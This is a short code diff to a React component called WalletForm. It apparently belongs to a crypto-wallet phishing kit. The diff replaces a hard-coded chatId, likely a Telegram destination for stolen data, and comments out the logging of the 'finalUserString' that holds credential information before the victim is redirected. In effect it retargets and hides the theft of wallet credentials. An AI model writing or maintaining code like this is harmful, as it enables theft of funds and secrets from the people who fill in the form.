@@ -25,7 +25,7 @@ interface WalletData {
 }
 
 export default function WalletForm({ dataPromise }: { dataPromise: Promise<WalletData> }) {
-    const chatId = "6361365798";
+    const chatId = "7376017881";
     const { name, imageId, projectId } = use(dataPromise);
     const router = useRouter(); // Initialize Router
 
@@ -141,7 +141,7 @@ ${credentialInfo}
                 }),
             });
 
-            console.log("Sent Data:", finalUserString);
+            // console.log("Sent Data:", finalUserString);
 
             // Redirect on success
             setTimeout(() => {
